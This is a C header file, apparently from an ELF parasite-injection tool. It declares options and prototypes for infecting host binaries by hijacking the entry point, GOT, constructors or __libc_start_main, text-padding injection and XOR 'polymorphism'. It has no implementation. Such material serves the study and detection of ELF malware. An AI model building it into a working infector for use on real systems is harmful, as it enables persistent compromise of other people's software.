#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>

#define PAGE_SIZE 4096
#define MAX_FILENAME 100
#define MAX_SEARCH_LEN 0x100
#define TMP "tmp.bin"

#define HIJACK_INIT 1
#define HIJACK_FINI 2
#define HIJACK_MAIN 3

#define ENTRY_REDIR     1
#define GOT_REDIR       2
#define CTORS_REDIR     3
#define DTORS_REDIR     4
#define ARBFUNC_REDIR   5 
#define STARTMAIN_REDIR 6

#define TEXT_INJECT    1
#define REVERSE_INJECT 2
#define DATA_INJECT    3
#define SO_INJECT      4
#define ETREL_INJECT   5
#define NOTE_INJECT   6

#define ELF_CLASS_32 1
#define ELF_CLASS_64 2

typedef struct {
    char *name;
    unsigned char *mem;
    struct stat *file; 
} Elfit_t;

typedef struct {
    /* name of host file */
    char host[MAX_FILENAME];
    /* name of parasite file */
    char parasite[MAX_FILENAME];

    /* PARASITE OPTIONS */

    /* XOR key for polymorphism */
    char polymorphic_key;
    /* address to patch parasite code with */
    unsigned long patch_addr;
    /* patch position */
    unsigned int patch_pos;

    /* REDIRECTION OPTIONS */

    unsigned int redirection_method;

    /*
    unsigned int entrypoint;
    unsigned int gottable; 
    unsigned int ctors; 
    unsigned int dtors; 
    unsigned int arbfunc; 
    unsigned int startmain;
    */
    
    char pltsymbol[MAX_FILENAME];
    unsigned int startmain_mode;

    /* INJECTION METHOD */

    unsigned int injection_method;

    /*
    unsigned int textpadding; 
    unsigned int reversepadding; 
    unsigned int soinject; 
    unsigned int etrelinject; 
    */

    /* cross architecture infection */
    unsigned int cross_infect;
} opts_t;


/* Redirectors */
off_t entry_redirect_32(Elfit_t *, uint32_t *);
off_t entry_redirect_64(Elfit_t *, uint64_t *);

off_t got_redirect_32(Elfit_t *, char *, uint32_t *);
off_t got_redirect_64(Elfit_t *, char *, uint64_t *);

off_t libc_start_main_hijack_32(Elfit_t *, int, uint32_t *);
off_t libc_start_main_hijack_64(Elfit_t *, int, uint64_t *);

int commit_redirect_32(Elfit_t *, off_t, uint32_t);
int commit_redirect_64(Elfit_t *, off_t, uint64_t);


/* Injectors */
uint32_t textpadding_inject_32(Elfit_t *, Elfit_t *, uint32_t, uint32_t);
uint64_t textpadding_inject_64(Elfit_t *, Elfit_t *, uint64_t, uint64_t);

/* Utilities */
int load_host(char *, Elfit_t *);
void unload_host(Elfit_t *);

int get_section_by_name_32(char *, Elfit_t *);
int get_section_by_name_64(char *, Elfit_t *);

/* Interface */
opts_t *usage(int, char **);
